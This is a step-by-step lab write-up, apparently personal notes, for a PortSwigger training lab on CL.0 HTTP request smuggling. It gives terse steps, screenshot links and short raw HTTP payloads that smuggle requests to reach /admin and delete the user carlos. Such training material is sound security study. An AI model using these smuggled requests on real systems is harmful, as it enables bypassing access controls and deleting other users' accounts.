# CL.0 request smuggling

## This lab is vulnerable to CL.0 request smuggling attacks. The back-end server ignores the `Content-Length` header on requests to some endpoints.

## To solve the lab, identify a vulnerable endpoint, smuggle a request to the back-end to access to the admin panel at `/admin`, then delete the user `carlos`.

## This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling](https://portswigger.net/research/browser-powered-desync-attacks#cl.0).

step 1

open admin panel into browser

![screenshot](./images/images_lab15/lab15_access_admin_page.png)

step 2
change HTTP/2 to HTTP/1.1
add header body userid=test

![screenshot](./images/images_lab15/lab15_remove_header_from_svg_post_request.png)

step 3
add transfer-encoding: chunked

![screenshot](./images/images_lab15/lab15_add_transfer_encoding.png)

step 4

remove header
content-Length
transfer-encoding
cookie-session

![screenshot](./images/images_lab15/lab15_remove_some_header.png)

step 5
check resource folder and check status code for svg

![screenshot](./images/images_lab15/lab15_find_status_code_from_resource_file.png)

step 6
send blog.svg to repeater

![screenshot](./images/images_lab15/lab15_test_svg_into_repeter_get_request.png)

step 7
change get request to post request

![screenshot](./images/images_lab15/lab15_test_post_request_svg_repeater.png)

step 8

remove extra header
![screenshot](./images/images_lab15/lab15_remove_some_header_from_svg.png)

step 9

add header userid=test

![screenshot](./images/images_lab15/lab15_add_header_userid_test_svg.png)

step 10
remove cookie header

![screenshot](./images/images_lab15/lab15_increse_content_length_userid_test_svg.png)

step 11

![screenshot](./images/images_lab15/lab15_test_payload_get_request_svg.png)

step 12
add

```http
GET / HTTP/1.1
foo: x
```

![screenshot](./images/images_lab15/lab15_get_request_add_foo_header.png)

step 13

```http
Content-Length: 27

GET /admin HTTP/1.1
foo: x
```

![screenshot](./images/images_lab15/lab15_add_admin_get_request_svg_payload.png)

step 14

```http
Content-Length: 50

GET /admin/delete?username=carlos HTTP/1.1
foo: x
```

![screenshot](./images/images_lab15/lab15_delete_carlos_account.png)

![screenshot](./images/images_lab15/lab15_lab_solved.png)
